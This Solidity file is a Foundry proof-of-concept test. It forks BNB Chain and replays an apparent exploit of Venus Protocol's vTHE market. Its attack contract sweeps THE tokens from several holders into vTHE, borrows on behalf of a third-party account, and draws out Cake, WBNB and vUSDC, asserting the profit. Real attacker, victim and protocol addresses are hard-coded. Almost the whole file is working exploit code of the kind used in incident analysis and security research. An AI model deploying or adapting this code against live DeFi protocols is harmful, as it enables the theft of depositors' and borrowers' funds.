
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 86731940;
    uint256 constant TX_TIMESTAMP = 1773575718;
    uint256 constant TX_BLOCK_NUMBER = 86731941;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        VenusTheAttack attack = _bindAttackContract();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _bindAttackContract() internal returns (VenusTheAttack attack) {
        _etchRuntime();
        attack = VenusTheAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(VenusTheAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(VenusTheAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.Cake, "Cake", 913858263360521396654198);
        _expectProfit(Addresses.attack_contract, attack, Addresses.WBNB, "WBNB", 1972530910582753621682);
        _expectProfit(Addresses.attack_contract, attack, Addresses.vUSDC, "vUSDC", 6000446829622765);
    }
}

contract VenusTheAttack {
    constructor() payable {}

    function attack() external payable {
        executeAttackSetup();
    }

    function executeAttackSetup() public payable {
        pullTheCollateral();
        approveProtocol();
        openVenusPosition();
        refreshRiskViews();
        borrowProfitAssets();
    }

    function pullTheCollateral() internal {
        uint256 collateralBalance = IERC20Like(Addresses.THE).balanceOf(Addresses.A_F05221_58AA);
        IERC20Like(Addresses.THE)
            .transferFrom(Addresses.A_F05221_58AA, Addresses.vTHE, collateralBalance);
        collateralBalance = IERC20Like(Addresses.THE).balanceOf(Addresses.A_89E361_DDB6);
        IERC20Like(Addresses.THE)
            .transferFrom(Addresses.A_89E361_DDB6, Addresses.vTHE, collateralBalance);
        collateralBalance = IERC20Like(Addresses.THE).balanceOf(Addresses.A_BB3782_EF87);
        IERC20Like(Addresses.THE)
            .transferFrom(Addresses.A_BB3782_EF87, Addresses.vTHE, collateralBalance);
        collateralBalance = IERC20Like(Addresses.THE).balanceOf(Addresses.A_564A07_4591);
        IERC20Like(Addresses.THE)
            .transferFrom(Addresses.A_564A07_4591, Addresses.vTHE, collateralBalance);
        collateralBalance = IERC20Like(Addresses.THE).balanceOf(Addresses.A_1A35BD_6231);
        IERC20Like(Addresses.THE)
            .transferFrom(Addresses.A_1A35BD_6231, Addresses.vTHE, collateralBalance);
        collateralBalance = IERC20Like(Addresses.THE).balanceOf(Addresses.A_16F09B_BF07);
        IERC20Like(Addresses.THE)
            .transferFrom(Addresses.A_16F09B_BF07, Addresses.vTHE, collateralBalance);
    }

    function approveProtocol() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.RouterV2, type(uint256).max);
        IERC20Like(Addresses.WBNB).approve(Addresses.A_9E19A4_9760, type(uint256).max);
        IERC20Like(Addresses.Cake).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.BTCB).approve(Addresses.PancakeRouter, type(uint256).max);
    }

    function openVenusPosition() internal {
        IVenusComptroller(Addresses.A_FD36E2_8384).borrowCaps(Addresses.vTHE);
        IVenusVToken(Addresses.vTHE).totalBorrows();
        IVenusPriceOracle(Addresses.OptimizedTransparentUpgradeableProxy).getPrice(Addresses.THE);
        IVenusVToken(Addresses.vUSDC).borrowBehalf(Addresses.A_1A35BD_6231, 1581454956604046563770845);
        IERC20Like(Addresses.USDC).approve(Addresses.vUSDC, 1581454956604046563770845);
        IVenusVToken(Addresses.vUSDC).mint(1581454956604046563770845);
        IVenusComptroller(Addresses.A_FD36E2_8384).enterMarkets(_addressArray1(Addresses.vUSDC));
        IVenusVToken(Addresses.vTHE).borrow(4628903900747323154634598);
        IERC20Like(Addresses.THE).transfer(Addresses.vTHE, 4628903900747323154634598);
        IVenusComptroller(Addresses.A_FD36E2_8384).markets(Addresses.vTHE);
        IERC20Like(Addresses.vTHE).balanceOf(Addresses.A_1A35BD_6231);
        IVenusVToken(Addresses.vTHE).exchangeRateStored();
    }

    function refreshRiskViews() internal {
        IVenusPriceOracle oracle = IVenusPriceOracle(Addresses.OptimizedTransparentUpgradeableProxy);
        address account = Addresses.A_1A35BD_6231;
        oracle.getUnderlyingPrice(Addresses.vTHE);
        _priceAndDebt(Addresses.VBep20Delegator_847B, account);
        _priceAndDebt(Addresses.A_FD5840_0255, account);
        _priceAndDebt(Addresses.VBep20Delegator_92C8, account);
        _priceAndDebt(Addresses.VBep20Delegator_C3EA, account);
        _priceAndDebt(Addresses.vUSDC, account);
        _priceAndDebt(Addresses.VBep20Delegator_A8A0, account);
        _priceAndDebt(Addresses.A_B248A2_9C10, account);
        _priceAndDebt(Addresses.A_EC3422_8D71, account);
        _priceAndDebt(Addresses.VBep20Delegator_3612, account);
        _priceAndDebt(Addresses.VBep20Delegator_2CEC, account);
        _priceAndDebt(Addresses.VBep20Delegator_A0BA, account);
        _priceAndDebt(Addresses.VBep20Delegator_28EC, account);
        _priceAndDebt(Addresses.VBep20Delegator_0C6B, account);
        _priceAndDebt(Addresses.VBep20Delegator_1F1F, account);
        _priceAndDebt(Addresses.A_F91D58_0343, account);
        _priceAndDebt(Addresses.VBep20Delegator_9176, account);
        _priceAndDebt(Addresses.VBep20Delegator_FBF1, account);
        _priceAndDebt(Addresses.VBep20Delegator_EDCC, account);
        _priceAndDebt(Addresses.VBep20Delegator_6F94, account);
        _priceAndDebt(Addresses.VBep20Delegator_71C1, account);
        _priceAndDebt(Addresses.VBep20Delegator_C6AB, account);
        _priceAndDebt(Addresses.VBep20Delegator_D217, account);
        _priceAndDebt(Addresses.vCAKE, account);
        _priceAndDebt(Addresses.VBep20Delegator, account);
        _priceAndDebt(Addresses.vWBNB, account);
    }

    function borrowProfitAssets() internal {
        IVenusPriceOracle(Addresses.OptimizedTransparentUpgradeableProxy).getPrice(Addresses.Cake);
        IVenusVToken(Addresses.vCAKE).borrowBehalf(Addresses.A_1A35BD_6231, 913858263360521396654198);
        IVenusPriceOracle(Addresses.OptimizedTransparentUpgradeableProxy).getPrice(Addresses.A_BBBBBB_BBBB);
        IVenusVToken(Addresses.vWBNB).borrowBehalf(Addresses.A_1A35BD_6231, 1972530910582753621682);
        IERC20Like(Addresses.Cake).balanceOf(address(this));
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function _priceAndDebt(address market, address account) internal {
        IVenusPriceOracle(Addresses.OptimizedTransparentUpgradeableProxy).getUnderlyingPrice(market);
        IVenusVToken(market).borrowBalanceStored(account);
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant VBep20Delegator = 0x0C1DA220D301155b87318B90692Da8dc43B67340;
    address internal constant Cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant VBep20Delegator_D217 = 0x1610bc33319e9398de5f57B33a5b184c806aD217;
    address internal constant A_16F09B_BF07 = 0x16f09B91604053E742eE0408909bAfA6a825bF07;
    address internal constant A_1A3020_FD5D = 0x1a302045a95C778f9B578F7bB9175cD02Ee6FD5d;
    address internal constant A_1A35BD_6231 = 0x1A35bD28EFD46CfC46c2136f878777D69ae16231;
    address internal constant VBep20Delegate = 0x1be1CE8352328278Ac4e0488436c0f1607282550;
    address internal constant VBep20Delegator_6F94 = 0x26DA28954763B92139ED49283625ceCAf52C6f94;
    address internal constant VBep20Delegator_3612 = 0x27FF564707786720C71A2e5c1490A63266683612;
    address internal constant VBep20Delegator_FBF1 = 0x334b3eCB4DCa3593BCCC3c7EBD1A1C1d1780FBF1;
    address internal constant attacker_eoa = 0x43C743e316F40d4511762EEdf6f6D484F67b2F82;
    address internal constant A_4B7DCD_BA79 = 0x4B7dcD967dC40e17e883Bf2ce21f6522A4c0Ba79;
    address internal constant VBep20Delegator_EDCC = 0x4d41a36D04D97785bcEA57b057C412b278e6Edcc;
    address internal constant A_564A07_4591 = 0x564A073Fa4cfa81C2c882168fA760A88b82A4591;
    address internal constant VBep20Delegator_0C6B = 0x57A5297F2cB2c0AaC9D554660acd6D385Ab50c6B;
    address internal constant VBep20Delegator_9176 = 0x5F0388EBc2B94FA8E123F404b79cCF5f40b29176;
    address internal constant PancakePair = 0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082;
    address internal constant Pair = 0x63Db6ba9E512186C2FAaDaCEF342FB4A40dc577c;
    address internal constant VBep20Delegator_1F1F = 0x650b940a1033B8A1b1873f78730FcFC73ec11f1f;
    address internal constant OptimizedTransparentUpgradeableProxy = 0x6592b5DE802159F3E74B2486b091D11a8256ab8A;
    address internal constant VBep20Delegator_C6AB = 0x689E0daB47Ab16bcae87Ec18491692BF621Dc6Ab;
    address internal constant vWBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9;
    address internal constant VBep20Delegator_A8A0 = 0x6CFdEc747f37DAf3b87a35a1D9c8AD3063A1A8A0;
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address internal constant attack_contract = 0x737bc98F1D34E19539C074B8Ad1169d5d45dA619;
    address internal constant vCAKE = 0x86aC3974e2BD0d60825230fa6F355fF11409df5c;
    address internal constant vTHE = 0x86e06EAfa6A1eA631Eab51DE500E3D474933739f;
    address internal constant VBep20Delegator_847B = 0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B;
    address internal constant A_89E361_DDB6 = 0x89E3615F356B3b40aCB2f8598117EAB1aFfddDB6;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant A_8D0863_BD2B = 0x8D08635Ebb0b4f9Fb6437Ec56ab5c144ED96BD2b;
    address internal constant VBep20Delegator_28EC = 0x9A0AF7FDb2065Ce470D72664DE73cAE409dA28Ec;
    address internal constant A_9E19A4_9760 = 0x9e19a4FfE29F4f0C38D9A61E67DA9d1F17aF9760;
    address internal constant A_A5CA50_597D = 0xA5Ca50F42C8F85AA219368c0c1C0eF0A4Aa5597d;
    address internal constant A_B0D52B_9462 = 0xB0d52bE2A77fC0bD88FFC5980a71eCB8007b9462;
    address internal constant A_B248A2_9C10 = 0xB248a295732e0225acd3337607cc01068e3b9c10;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant A_BB3782_EF87 = 0xbb3782048735091AB4C304693a69371965A4ef87;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BBBBBB_BBBB = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;
    address internal constant VBep20Delegator_2CEC = 0xBf515bA4D1b52FFdCeaBF20d31D705Ce789F2cEC;
    address internal constant A_C38420_8CAA = 0xc384205e03D2c2E3F8B80860abb800F616678Caa;
    address internal constant VBep20Delegator_A0BA = 0xC4eF4229FEc74Ccfe17B2bdeF7715fAC740BA0ba;
    address internal constant VBep20Delegator_71C1 = 0xC5D3466aA484B040eE977073fcF337f2c00071c1;
    address internal constant XVS = 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63;
    address internal constant RouterV2 = 0xd4ae6eCA985340Dd434D38F470aCCce4DC78D109;
    address internal constant A_E714CD_FB85 = 0xe714cdAa1B312c0Fa0B2e408CAd2b77c6d9Efb85;
    address internal constant A_EC3422_8D71 = 0xec3422Ef92B2fb59e84c8B02Ba73F1fE84Ed8D71;
    address internal constant vUSDC = 0xecA88125a5ADbe82614ffC12D0DB554E2e2867C8;
    address internal constant A_F05221_58AA = 0xf052219F767612C411C9fE4a0F334237429c58AA;
    address internal constant THE = 0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11;
    address internal constant VBep20Delegator_92C8 = 0xf508fCD89b8bd15579dc79A6827cB4686A3592c8;
    address internal constant VBep20Delegator_C3EA = 0xf841cb62c19fCd4fF5CD0AaB5939f3140BaaC3Ea;
    address internal constant A_F91D58_0343 = 0xf91d58b5aE142DAcC749f58A49FCBac340Cb0343;
    address internal constant A_FD36E2_8384 = 0xfD36E2c2a6789Db23113685031d7F16329158384;
    address internal constant A_FD5840_0255 = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
    address internal constant A_FF0000_0000 = 0xfF00000000000000000000000000000000000000;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IVenusComptroller {
    function borrowCaps(address) external returns (uint256);
    function enterMarkets(address[] calldata) external;
    function markets(address) external;
}

interface IVenusPriceOracle {
    function getPrice(address) external returns (uint256);
    function getUnderlyingPrice(address) external returns (uint256);
}

interface IVenusVToken {
    function borrowBalanceStored(address) external returns (uint256);
    function borrowBehalf(address, uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function exchangeRateStored() external returns (uint256);
    function totalBorrows() external returns (uint256);
    function mint(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}
